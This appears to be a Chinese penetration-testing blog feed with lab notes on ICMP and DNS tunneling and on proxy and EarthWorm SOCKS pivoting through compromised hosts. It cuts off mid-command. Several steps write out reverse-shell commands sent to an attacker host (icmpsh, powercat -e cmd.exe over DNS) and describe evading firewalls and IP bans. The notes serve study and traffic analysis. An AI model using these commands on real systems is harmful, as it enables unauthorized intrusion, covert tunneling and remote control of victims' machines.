    <content type="html"><![CDATA[<h1 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h1><p>扩展知识面（大多数时候用的是应用层隧道）</p><h2 id="ICMP介绍"><a href="#ICMP介绍" class="headerlink" title="ICMP介绍"></a>ICMP介绍</h2><p>ICMP（InternetControl MessageProtocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协 议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、<strong>主机是否可达</strong>、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用  <a href="..%5C%E7%A0%94%E7%A9%B6%E7%94%9F%E7%9B%B8%E5%85%B3%5C11%E6%9C%88%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.md">11月漏洞挖掘.md</a> 主要概念有： </p><p><strong>1.确认ip数据包是否成功到达目的地</strong> </p><p>2.通知源主机发送ip数据包丢失的原因 </p><p>3.ICMP是基于IP协议工作的 </p><p>4.ICMP只能作用于IPV4，IPV6下</p><p><img src="/img/image-20231112141946209.png" alt="image-20231112141946209"></p><p>类型 </p><p>3 终点不可达 </p><p>11 时间超过 </p><p>12 参数问题 </p><p>5 改变路由 </p><p>8或0 回送请求或回答 </p><p>13或14 时间戳请求或回答</p><p>代码 </p><p>进一步区分某种类型中的几种不同情况。 </p><p>检验和 </p><p>用于检验整个ICMP报文。但是IP首部检验和并不检验IP数据报的内容，因此不能保证经过传输的ICMP 报文不产生差错。 </p><p>ICMP 报文的种类有两种,即 ICMP 差错报告报文和 ICMP 询问报文</p><h2 id="ICMP抓包分析"><a href="#ICMP抓包分析" class="headerlink" title="ICMP抓包分析"></a>ICMP抓包分析</h2><p>一般PING命令就是使用ICMP的协议执行 ping 8.8.8.8</p><p><img src="/img/image-20231112142922623.png"></p><p>第一个包是请求的数据包</p><p><img src="/img/image-20231112143004921.png" alt="image-20231112143004921"></p><p>第二个数返回的数据包</p><p><img src="/img/image-20231112143018755.png" alt="image-20231112143018755"></p><p>可以看到data 中的字段数固定的值（windows可能是abcd……  linux可能是!”#$%………）</p><p><img src="/img/image-20231112143046717.png" alt="image-20231112143046717"></p><h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。<strong>把数据隐藏在ICMP数据包包头的data字段中，建立隐蔽通道</strong>。实现绕过防火墙和入侵检测系统的阻拦。</p><p>优点： </p><p>1.ICMP隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低 </p><p>2.利用隧道传输时，需要接触更低层次的协议，这就需要高级用户权限</p><h2 id="ICMP隧道实验"><a href="#ICMP隧道实验" class="headerlink" title="ICMP隧道实验"></a>ICMP隧道实验</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>ICMP做隧道一般有这么几种，一种是反弹shell 的形式</p><p>icmpsh使用简单，使用的是python，项目地址：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>该工具安装起来比较复杂，使用的是python2,</p><p>1、下载工具，然后执行安装依赖的命名</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> impacket<br></code></pre></td></tr></table></figure><p>2、执行禁用icmp回复</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sysctl -w net.ipv4.<span class="hljs-attribute">icmp_echo_ignore_all</span>=1<br></code></pre></td></tr></table></figure><p>3、开启监听命令</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">python</span> icmpsh_m.py 攻击者<span class="hljs-built_in">IP</span> 受害者<span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231112143828749.png" alt="image-20231112143828749"></p><p>4、在受害者机器执行反弹命令</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">icmpsh.exe</span> -t 攻击者<span class="hljs-built_in">IP</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231112143838192.png" alt="image-20231112143838192"></p><p>5、收到反弹shell的内容</p><img src="/img/image-20231112143821047.png" alt="image-20231112143821047" style="zoom:67%;" /><p>6、查看流量（没有加密）</p><p><img src="/img/image-20231112144707643.png" alt="image-20231112144707643"></p><h3 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h3><p>ICMP可以用作反弹shell，也可以用作隧道,这里我们使用工具:pingtunnel </p><p>下载地址;<a href="https://github.com/esrrhs/pingtunnel/releases/tag/2.7">https://github.com/esrrhs/pingtunnel/releases/tag/2.7</a></p><p><img src="/img/image-20231112144856727.png" alt="image-20231112144856727"></p><p>首先将需要的版本下载下来然后进行隧道搭建 </p><p>1、开启服务端</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">pingtunnel</span> -<span class="hljs-keyword">type</span> server<br></code></pre></td></tr></table></figure><p>2、开启客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pingtunnel</span>.exe -type client -l <span class="hljs-number">127.0.0.1:3333</span> -s <span class="hljs-number">172.16.100.108</span> -t<br><span class="hljs-attribute">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">100</span>.<span class="hljs-number">222</span>:<span class="hljs-number">2222</span> -tcp <span class="hljs-number">1</span> -noprint <span class="hljs-number">1</span> -nolog <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>3、可以查看他的用法</p><p><img src="/img/image-20231112144931959.png" alt="image-20231112144931959"></p><p>来看一下网络拓扑才能更好理解这个隧道</p><p><img src="/img/image-20231112145136519.png" alt="image-20231112145136519"></p><p>1、开启服务端，在VPS执行</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">pingtunnel</span> -<span class="hljs-keyword">type</span> server<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231112145210554.png" alt="image-20231112145210554"></p><p>2、靶机执行开启转发的命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pingtunnel</span>.exe -type client -l :<span class="hljs-number">9999</span> -s <span class="hljs-number">118.178.134.226</span> -t <span class="hljs-number">118.178.134.226:7777</span> -tcp <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>将来自和本地9999端口连接的流量，转发给118.178.134.226的7777端口，然后我们就可以创建一个 CS的监听器完成操作</p><p>3、设置监听器</p><p><img src="/img/image-20231112150053810.png" alt="image-20231112150053810"></p><p>4、生成木马然后看一下点击链接</p><p><img src="/img/image-20231112145332053.png" alt="image-20231112145332053"></p><p>5、查看流量</p><p><img src="/img/image-20231112145353881.png" alt="image-20231112145353881"></p><h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h2 id="DNS协议介绍"><a href="#DNS协议介绍" class="headerlink" title="DNS协议介绍"></a>DNS协议介绍</h2><p>域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一 级域名长度的限制是63个字符，域名总长度则不能超过253个字符。DNS协议是用来将域名转换为IP地址,DNS除了提供主机名到IP地址转换外，还提供如下服务：主机别名、邮件服务器别名、负载分配等。</p><h2 id="DNS报文格式"><a href="#DNS报文格式" class="headerlink" title="DNS报文格式"></a>DNS报文格式</h2><p>DNS 定义了两种报文 ，一种为查询报文；另一种是对查询报文的响应，称为响应报文。无论是查询报文还是响应报文</p><p><img src="/img/image-20231112150555247.png" alt="image-20231112150555247"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">ID:由生成DNS查询的程序指定的<span class="hljs-number">16</span>位的标志符。该标志符也被随后的应答报文所用，申请者利用这个标志将<br>应答和原来的请求对应起来.<br>flags：标志位，标记查询/应答，查询类型，截断，递归查询等等<br>type：DNS记录类型，常用的有：<br>    <span class="hljs-keyword">A</span>：<span class="hljs-keyword">A</span>记录，指向别名或IP地址。<br>    <span class="hljs-keyword">NS</span>：解析服务器记录。<br>    <span class="hljs-keyword">MX</span>：邮件交换记录。<br>    <span class="hljs-keyword">CNAME</span>：别名。<br>    <span class="hljs-keyword">AAAA</span>：IPv6地址解析。<br>    txt：为某个主机名或域名设置的说明。<br>    <span class="hljs-keyword">PTR</span>：指针记录，<span class="hljs-keyword">PTR</span>记录是<span class="hljs-keyword">A</span>记录的逆向记录。<br>    <span class="hljs-keyword">SOA</span>：标记一个区的开始，起始授权机构记录。<br></code></pre></td></tr></table></figure><p>PING一下百度看一看流量 </p><p>请求数据包</p><p><img src="/img/image-20231112151328242.png" alt="image-20231112151328242"></p><p><img src="/img/image-20231112152113755.png" alt="image-20231112152113755"> </p><p>返回数据包</p><img src="/img/image-20231112151607110.png" alt="image-20231112151607110" style="zoom: 67%;" />  <p>一般DNS隧道中通信的内容隐藏在请求区域和回答区域中，可能在不同的type类型中隐藏的地方不同</p><h2 id="DNS隧道搭建（dnscat）"><a href="#DNS隧道搭建（dnscat）" class="headerlink" title="DNS隧道搭建（dnscat）"></a>DNS隧道搭建（dnscat）</h2><p>dnscat是可以用来进行DNS隧道进行通信的，工具有客户端和服务端，下载地址：<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> </p><p>工具安装非常简单</p><p>服务端安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt-get <span class="hljs-keyword">install</span> ruby-dev<br>cd dnscat2/server/<br>gem <span class="hljs-keyword">install</span> bundler<br>bundle <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p>客户端安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd dnscat2<span class="hljs-regexp">/client/</span><br>make<br></code></pre></td></tr></table></figure><p>1、在kali 中执行如下命令开启服务端</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ruby</span> dnscat2.rb <span class="hljs-keyword">pc</span>.test -<span class="hljs-keyword">e</span> <span class="hljs-keyword">open</span> --<span class="hljs-keyword">no</span>-cache<br></code></pre></td></tr></table></figure><p>2、在windows使用powercat连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.41.134</span> -p <span class="hljs-number">53</span> -dns pc.test -e cmd.exe<br></code></pre></td></tr></table></figure><p>3、收到反弹shell的隧道</p><img src="/img/image-20231112152525065.png" alt="image-20231112152525065" style="zoom:67%;" /> <h2 id="DNS隧道流量分析"><a href="#DNS隧道流量分析" class="headerlink" title="DNS隧道流量分析"></a>DNS隧道流量分析</h2><p>分析上述隧道的流量</p><p><img src="/img/image-20231112152354586.png" alt="image-20231112152354586"></p><p>通过分析发现DNS请求类型是TXT，为某个主机名或域名设置的说明。并且域名的有所变化，通过观看应该是16进制加密的，分期其中一段为（C:\Users\Ad.ministrator&gt;.pc.test）</p>]]></content>
    
    
    <categories>
      
      <category>内网隧道技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>应用层代理技术</title>
    <link href="/2023/11/27/%E5%BA%94%E7%94%A8%E5%B1%82%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/11/27/%E5%BA%94%E7%94%A8%E5%B1%82%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层代理技术"><a href="#应用层代理技术" class="headerlink" title="应用层代理技术"></a>应用层代理技术</h1><h1 id="应用层代理介绍"><a href="#应用层代理介绍" class="headerlink" title="应用层代理介绍"></a>应用层代理介绍</h1><p>应用层代理是我们最常用的代理，平时在进行内网渗透，或者扫描的时候经常需要这个代理，根据协议不同大体有以下的分类</p><p>1、http代理</p><p>2、socks代理 </p><p>3、SSH代理 </p><p>4、DNS代理</p><p>5、还有自定义的一些协议和加密规则</p><p>每种代理应用的场景不同，在不同的场景需要选择不同的代理</p><h2 id="代理场景介绍"><a href="#代理场景介绍" class="headerlink" title="代理场景介绍"></a>代理场景介绍</h2><h3 id="一、公网资产扫描"><a href="#一、公网资产扫描" class="headerlink" title="一、公网资产扫描"></a>一、公网资产扫描</h3><p>平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对方封掉你的IP地址，我们需要挂代理</p><img src="/img/image-20231101101933161.png" alt="image-20231101101933161" style="zoom:80%;" /> <p>在这种情况我我们需要哪些东西走代理呢？</p><p>1、扫描器工具</p><p>2、浏览器 </p><p>3、burpsuite</p><p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p><img src="/img/image-20231101102015638.png" alt="image-20231101102015638" style="zoom:80%;" /> <p>这里的代理分为两类 </p><p>1、单个代理：单代理就是一个代理机器，只有一个IP，不会自动切换</p><img src="/img/image-20231101102138583.png" alt="image-20231101102138583" style="zoom:80%;" /> <p>2、代理池：代理池就是一堆IP地址，可以实现自动变化，每次请求都变化</p><img src="/img/image-20231101102117551.png" alt="image-20231101102117551" style="zoom:80%;" /> <p>注意：有些工具支持可以将单个代理IP写到文本中，从而实现代理池的功能</p><h3 id="二、内网资产扫描"><a href="#二、内网资产扫描" class="headerlink" title="二、内网资产扫描"></a>二、内网资产扫描</h3><p>内网资产扫描这种场景一般是进行内网渗透才需要的代理技术，如果你不打内网一般是不需要这种技术的，内网代理技术一般也是采用http或者socks代理</p><img src="/img/image-20231101103418668.png" alt="image-20231101103418668" style="zoom:80%;" /> <p>针对以上的情况我们需要如何对内网进行扫描呢？ </p><p>1、直接使用web服务进行扫描</p><p>2、做代理让web服务成为代理机器</p><p>针对于内网的机器要考虑是用代理隧道还是使用端口转发</p><p>在这种情况需要用什么工具走代理呢？ </p><p>1、扫描工具 </p><p>2、浏览器 </p><p>3、burp</p><p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p><img src="/img/image-20231101103757675.png" alt="image-20231101103757675" style="zoom:80%;" /> <p>总体就是这样的情况第一种一般是买代理，第二种一般是做代理</p><h1 id="1-公网资产扫描代理配置"><a href="#1-公网资产扫描代理配置" class="headerlink" title="1.公网资产扫描代理配置"></a>1.公网资产扫描代理配置</h1><h2 id="单代理配置"><a href="#单代理配置" class="headerlink" title="单代理配置"></a>单代理配置</h2><h3 id="单代理介绍"><a href="#单代理介绍" class="headerlink" title="单代理介绍"></a>单代理介绍</h3><p>平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对方封掉你的IP地址，或者IP 已经封了我们需要挂代理</p><p><img src="/img/image-20231101105128680.png" alt="image-20231101105128680"> </p><h3 id="单个代理"><a href="#单个代理" class="headerlink" title="单个代理"></a>单个代理</h3><p>单个代理表示就一个IP代理机器，IP地址不会自动切换</p><p>单个代理一般大家都用的免费的</p><p>一般免费的这种单个代理有以下的弊端 </p><p>1、使用人比较多网速比较慢，很多都用不了 </p><p>2、有可能这些代理是有些公司主动放出的用来收集用户信息</p><h3 id="筛选代理"><a href="#筛选代理" class="headerlink" title="筛选代理"></a>筛选代理</h3><p>1、购买或者使用免费的单个代理IP</p><p>网站：<a href="https://www.kuaidaili.com/">https://www.kuaidaili.com</a> </p><p>快代理提供了免费的单个代理IP,也可以花钱购买自己独有的IP</p><img src="/img/image-20231101105923631.png" alt="image-20231101105923631" style="zoom:80%;" /> <p>2、将IP地址整理然后进行测试，看一下那个可以用</p><p>可以使用代理检测工具检测一下 </p><p><a href="http://www.leishenhttp.com/index/check/index.html">http://www.leishenhttp.com/index/check/index.html</a> </p><p><a href="https://www.zdaye.com/ip/CheckHttp/">https://www.zdaye.com/ip/CheckHttp/</a></p><p><img src="/img/image-20231101110353051.png" alt="image-20231101110353051"></p><h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><p>1、浏览器</p><p><img src="/img/image-20231101110514944.png" alt="image-20231101110514944"> </p><p>2、burp</p><p>useroptions</p><p><img src="/img/image-20231101111030680.png" alt="image-20231101111030680"> </p><p>3、工具有些扫描工具是支持代理的可以查看工具的具体命令看看用法</p><img src="/img/image-20231101111326120.png" alt="image-20231101111326120" style="zoom: 67%;" /> <h2 id="代理池配置"><a href="#代理池配置" class="headerlink" title="代理池配置"></a>代理池配置</h2><p>代理池的意思就是拥有多个代理可以随意切换的东西，那么代理池一般有几种用法呢 </p><p>1、购买代理池，购买的东西会自动切换IP，简单又方便 </p><p>2、有些工具可以支持文本代理的方式，就是将很多单个IP代理放在一个文件里面，他会自动使用和切换</p><h3 id="购买代理池"><a href="#购买代理池" class="headerlink" title="购买代理池"></a>购买代理池</h3><p>购买完成之后需要填写地址和端口还有域名</p><p><img src="/img/image-20231101112414406.png" alt="image-20231101112414406"></p><h3 id="使用代理池"><a href="#使用代理池" class="headerlink" title="使用代理池"></a>使用代理池</h3><p>1、使用浏览器</p><p>2、使用BURP</p><p><img src="/img/image-20231101112448181.png" alt="image-20231101112448181"></p><p>代理后访问百度</p><p><img src="/img/image-20231101112457877.png" alt="image-20231101112457877"></p><p>3、使用工具  很多工具不支持代理，或者不支持密码认证这个使用想用代理怎么办，就需要使用第三方的工具来进行代理的使用（专业技代理：例如proxifier proxychain）</p><h2 id="SSTAP和Shadowsocks"><a href="#SSTAP和Shadowsocks" class="headerlink" title="SSTAP和Shadowsocks"></a>SSTAP和Shadowsocks</h2><p>当我们想让我们的电脑全局都走代理的时候，就需要使用到全局代理，设置了全局代理我们的任何工具 直接使用不需要再做任何的配置，所有使用工具 使用BP浏览器不用做任何的配置，默认就走代理，这 种方式最推荐</p><h3 id="Shadowsocks（与clash原理相同）"><a href="#Shadowsocks（与clash原理相同）" class="headerlink" title="Shadowsocks（与clash原理相同）"></a>Shadowsocks（与clash原理相同）</h3><p>声明：v2ray &#x2F; winXray &#x2F; Clash &#x2F; Shadowrocket &#x2F; Quantumult ，目前这种科学上网的方式也是属于代 理的技术</p><p>这种工具一般是SSR订阅得到IP地址的，支持全局代理和本地代理</p><h4 id="Shadowsocks-原理介绍"><a href="#Shadowsocks-原理介绍" class="headerlink" title="Shadowsocks-原理介绍"></a>Shadowsocks-原理介绍</h4><p>使用自己的的协议和加密方式，用软件连接代理访问外网</p><p><img src="/img/image-20231101113556389.png" alt="image-20231101113556389"></p><h4 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h4><p>1、首先找一个国外的服务器（专业名字叫VPS）在机器上配置相应的规则和混淆</p><p><img src="/img/image-20231101113726757.png" alt="image-20231101113726757"></p><p>2、使用该工具连接服务器，使用相同的加密方式，进行连接</p><p><img src="/img/image-20231101113757693.png" alt="image-20231101113757693"></p><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><p>该工具支持全局和PAC，全局的意思就是所有的工具都会通过该工具进行代理</p><p><strong>全局模式</strong></p><p>全局模式会在系统代理设置⼿动设置⼀个代理服务器，所有跟随系统代理设置的软件(⼀般是浏览器)都 会使⽤这个代理服务器。</p><p><img src="/img/image-20231101114037807.png" alt="image-20231101114037807"></p><p><strong>PAC</strong></p><p>代理⾃动配置(英语：Proxy auto-config，简称PAC)是⼀种⽹页浏览器技术，⽤于定义浏览器该如何⾃ 动选择适当的代理服务器来访问⼀个⽹址</p><p><img src="/img/image-20231101114057925.png" alt="image-20231101114057925"></p><h3 id="SSTAP-适合全局代理"><a href="#SSTAP-适合全局代理" class="headerlink" title="SSTAP(适合全局代理)"></a>SSTAP(适合全局代理)</h3><h4 id="SSTAP介绍"><a href="#SSTAP介绍" class="headerlink" title="SSTAP介绍"></a>SSTAP介绍</h4><p>SSTap简介 SSTap是SocksCap64作者新开发的一款利用虚拟网卡实现的网络层代理。支持TCP,UDP，该 工具使用简单，可以使用于游戏，建议大家使用这个进行扫描 </p><h4 id="SSTAP安装"><a href="#SSTAP安装" class="headerlink" title="SSTAP安装"></a>SSTAP安装</h4><p>1、一直点击下一步安装</p><p>2、中途会给电脑安装一个虚拟网卡</p><p><img src="/img/image-20231101114911272.png" alt="image-20231101114911272"> </p><p>3、完成之后可以配置HTTP代理socks代理还有订阅链接</p><p><img src="/img/image-20231101115016765.png" alt="image-20231101115016765"> </p><p>4、支持的方式有全局和浏览器</p><p><img src="/img/image-20231101115124375.png" alt="image-20231101115124375"> </p><h4 id="SSTP使用"><a href="#SSTP使用" class="headerlink" title="SSTP使用"></a>SSTP使用</h4><p>1、浏览器使用 </p><p>2、burp使用 </p><p>3、cmd使用</p><h1 id="2-应用层内网代理"><a href="#2-应用层内网代理" class="headerlink" title="2.应用层内网代理"></a>2.应用层内网代理</h1><h2 id="内网代理介绍"><a href="#内网代理介绍" class="headerlink" title="内网代理介绍"></a>内网代理介绍</h2><p>内网资产扫描这种场景一般是进行内网渗透才需要的代理技术，如果不打内网一般是不需要这种技术 的，内网代理技术一般也是采用http或者socks代理</p><p><img src="/img/image-20231101144350020.png" alt="image-20231101144350020"></p><p>针对以上的情况我们需要如何对内网进行扫描呢？ </p><p>1、直接使用web服务进行扫描（参考内网渗透） </p><p>2、做代理让web服务成为代理机器</p><p>针对于内网的机器要考虑是用代理隧道还是使用端口转发</p><p>在这种情况需要用什么工具走代理呢？ </p><p>1、扫描工具 </p><p>2、浏览器 </p><p>3、burp </p><p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p><p><img src="/img/image-20231101144459157.png" alt="image-20231101144459157"></p><h2 id="代理连接工具"><a href="#代理连接工具" class="headerlink" title="代理连接工具"></a>代理连接工具</h2><h3 id="windows工具"><a href="#windows工具" class="headerlink" title="windows工具"></a>windows工具</h3><p>如果是windows是proxifire工具</p><p>1、运行软件然后点进进行一步一步安装</p><p>2、安装完成运行软件</p><p>3、打开代理服务器配置，可以看到支持http和socks代理</p><img src="/img/image-20231101150505489.png" alt="image-20231101150505489" style="zoom:80%;" /> <p>4、该工具支持代理链，代理链可以支持多级代理</p><h3 id="linux工具"><a href="#linux工具" class="headerlink" title="linux工具"></a>linux工具</h3><p>linux工具下一般使用命令行工具proxychains</p><p>该工具在kali中自带</p><p>安装步骤 </p><p>1、下载Proxychains源码，可以从GitHub上下载，或者直接从官网下载<a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a></p><p>2、解压文件然后进行安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">tar zxvf proxychains-ng-<span class="hljs-number">4.16</span>.tar.gz<br><span class="hljs-keyword">cd</span> proxychains-ng-<span class="hljs-number">4.16</span><br>./configure<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>3、安装完成之后，需要修改配置文件&#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf(其中kali的在&#x2F;etc&#x2F;proxychains4.conf)，将其中的代理服务器修改为你的代理服务器</p><p><img src="/img/image-20231101152200192.png" alt="image-20231101152200192"> </p><p>4、修改完成之后，可以使用proxychains命令来使用代理服务器，示例</p><p><img src="/img/image-20231101152411452.png" alt="image-20231101152411452"> </p><h2 id="EW-EarthWorm-工具"><a href="#EW-EarthWorm-工具" class="headerlink" title="EW(EarthWorm)工具"></a>EW(EarthWorm)工具</h2><h3 id="Earthworm简介"><a href="#Earthworm简介" class="headerlink" title="Earthworm简介"></a>Earthworm简介</h3><p>Earthworm简称EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功 能，可在复杂网络环境下完成网络穿透</p><p>该工具已经停止维护和下载：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>该工具支持端口转发，正向代理，反向代理，多级代理等方式，可以打通一条网络隧道，直达网络深 处，用蚯蚓独有的手段突破网络限制</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><h3 id="1-（一级代理）正向代理"><a href="#1-（一级代理）正向代理" class="headerlink" title="1.（一级代理）正向代理"></a>1.（一级代理）正向代理</h3><p>拓扑图如下 </p><p>正向意思就是攻击者可以访问目标的机器，也就意味着目标的机器在公网，如下拓扑，例如通过web漏洞打进去</p><p><img src="/img/image-20231101155432136.png" alt="image-20231101155432136"></p><p>正向连接就是黑客主动连接web服务器，在web开启监听</p><p>将ew上传到web服务器 并且执行如下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>黑客的电脑使用froxyifile或者proxychains等工具进行连接</p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、使用漏洞将web服务器控制下来然后上传ew工具执行开启监听</p><p><img src="/img/image-20231101162838489.png" alt="image-20231101162838489"> </p><p>2、使用proxyifile连接</p><p><img src="/img/image-20231101163043106.png" alt="image-20231101163043106"></p><p>3、配置代理规则</p><p><img src="/img/image-20231101163216487.png" alt="image-20231101163216487"></p><p>4、linux  使用proxychains，修改配置文件即可</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">proxychai<span class="hljs-symbol">ns4</span> firefox    即firefox走代理<br></code></pre></td></tr></table></figure><h3 id="2-（一级代理）反向代理"><a href="#2-（一级代理）反向代理" class="headerlink" title="2.（一级代理）反向代理"></a>2.（一级代理）反向代理</h3><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演 示了。例如钓鱼钓到内网主机</p><p><img src="/img/image-20231101164919957.png" alt="image-20231101164919957"></p><p>VPS执行如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>目标器执行如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d vps -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就 会看到 rssocks cmd_socket OK! 的提示</p><p>在黑客的机器上使用工具连接VPS的1080端口</p><h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、先在VPS上开启监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231101170117670.png" alt="image-20231101170117670"> </p><p>2、然后再靶机上连接VPS</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s rssocks -d vpsIP -e <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231101170135655.png" alt="image-20231101170135655"></p><p>3、在黑客电脑上使用工具连接vps的1080端口即可</p><h3 id="3-（二级代理）正向连接"><a href="#3-（二级代理）正向连接" class="headerlink" title="3.（二级代理）正向连接"></a>3.（二级代理）正向连接</h3><p>二级代理发生在如下的情况</p><p><img src="/img/image-20231101170820807.png" alt="image-20231101170820807"></p><p>1、web服务器在公网黑客可以访问</p><p>2、B机器在内网黑客不能访问 </p><p>3、web服务器只能访问B机器 </p><p>4、B机器可以访问内网机器</p><p>这种情况使用二级正向代理 </p><p>在B主机上执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>在web服务器上执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s lcx_tran -l <span class="hljs-number">1080</span> -f B -g <span 